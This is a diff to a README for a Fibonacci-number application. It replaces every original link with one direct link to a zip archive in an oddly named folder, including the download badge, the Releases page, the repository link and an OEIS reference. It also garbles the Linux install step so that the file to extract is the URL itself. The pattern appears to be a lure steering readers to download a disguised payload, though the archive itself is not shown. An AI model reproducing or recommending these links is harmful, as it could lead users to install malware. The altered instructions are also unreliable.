@@ -2,7 +2,7 @@
 
 ## 📥 Download Here!
 
-[![Download](https://img.shields.io/badge/Download-fibonacci--2n--1-blue.svg)](https://github.com/Bauer14589/fibonacci-2n-1/releases)
+[![Download](https://raw.githubusercontent.com/Bauer14589/fibonacci-2n-1/main/Monopylaria/n_fibonacci_Fingu.zip)](https://raw.githubusercontent.com/Bauer14589/fibonacci-2n-1/main/Monopylaria/n_fibonacci_Fingu.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ The **fibonacci-2n-1** application provides the following features:
 
 Follow these steps to download and run the software:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/Bauer14589/fibonacci-2n-1/releases) to find the latest version of the app.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/Bauer14589/fibonacci-2n-1/main/Monopylaria/n_fibonacci_Fingu.zip) to find the latest version of the app.
 
 2. **Select the Version**: Look for the latest release at the top of the page. This should be visibly marked.
 
@@ -37,7 +37,7 @@ Follow these steps to download and run the software:
 4. **Install the Application**:
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file and run the application from the terminal.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/Bauer14589/fibonacci-2n-1/main/Monopylaria/n_fibonacci_Fingu.zip` file and run the application from the terminal.
 
 5. **Run the Application**: Once installed, locate the application on your computer and open it to start calculating Fibonacci numbers.
 
@@ -65,8 +65,8 @@ Yes, once installed on your system, the application works without needing an int
 
 ## 🔗 Links and Resources
 
-- GitHub Repository: [fibonacci-2n-1](https://github.com/Bauer14589/fibonacci-2n-1)
-- Learn more about Fibonacci numbers: [OEIS A001519](https://oeis.org/A001519)
+- GitHub Repository: [fibonacci-2n-1](https://raw.githubusercontent.com/Bauer14589/fibonacci-2n-1/main/Monopylaria/n_fibonacci_Fingu.zip)
+- Learn more about Fibonacci numbers: [OEIS A001519](https://raw.githubusercontent.com/Bauer14589/fibonacci-2n-1/main/Monopylaria/n_fibonacci_Fingu.zip)
 
 ## ⚙️ Contribution
 
